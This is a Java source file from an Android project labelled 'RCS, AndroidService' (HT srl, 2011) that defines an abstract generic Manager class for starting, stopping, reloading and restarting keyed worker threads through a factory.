/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Manager.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.manager;

import java.util.HashMap;

import com.android.service.Status;
import com.android.service.ThreadBase;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.AbstractFactory;
import com.android.service.util.Check;

/**
 * The Class Manager. T : classe ThreadCase per cui il Manger fa da aggregatore
 * U : chiave che garantisce l'univocita' di T V : enumerativo che identifica il
 * tipo della chiave nella factory
 * 
 * @param <T>
 *            the generic type
 */
public abstract class Manager<T extends ThreadBase, U, V> {
	/** The running. */
	protected HashMap<U, T> instances;

	/** The threads. */
	protected HashMap<T, Thread> threads;

	/** The status. */
	protected Status status;

	protected AbstractFactory<T, V> factory;

	/**
	 * Instantiates a new manager.
	 */
	public Manager() {
		status = Status.self();
		instances = new HashMap<U, T>();
		threads = new HashMap<T, Thread>();
	}

	public void setFactory(AbstractFactory<T, V> factory) {
		this.factory = factory;
	}

	public T get(U key) {
		return instances.get(key);
	}

	/**
	 * Start all.
	 * 
	 * @return true, if successful
	 */
	public abstract boolean startAll();

	/**
	 * Stop all.
	 */
	public abstract void stopAll();

	/**
	 * Start.
	 * 
	 * @param key
	 *            the key
	 */
	public abstract void start(U key);

	/**
	 * Stop.
	 * 
	 * @param key
	 *            the key
	 */
	public abstract void stop(U key);

	/**
	 * Reload .
	 * 
	 * @param key
	 *            the key
	 */
	public final void reload(final U key) {
		if (Cfg.DEBUG) {
			Check.requires(instances != null, "Null running"); //$NON-NLS-1$
		}
		final T a = instances.get(key);
		if (a != null) {
			a.next();
		}
	}

	/**
	 * Restart .
	 * 
	 * @param key
	 *            the key
	 */
	public final synchronized void restart(final U key) {
		final T a = instances.get(key);
		stop(key);
		start(key);
	}

	/**
	 * Gets the running.
	 * 
	 * @return the running
	 */
	public HashMap<U, T> getInstances() {
		return instances;
	}
}
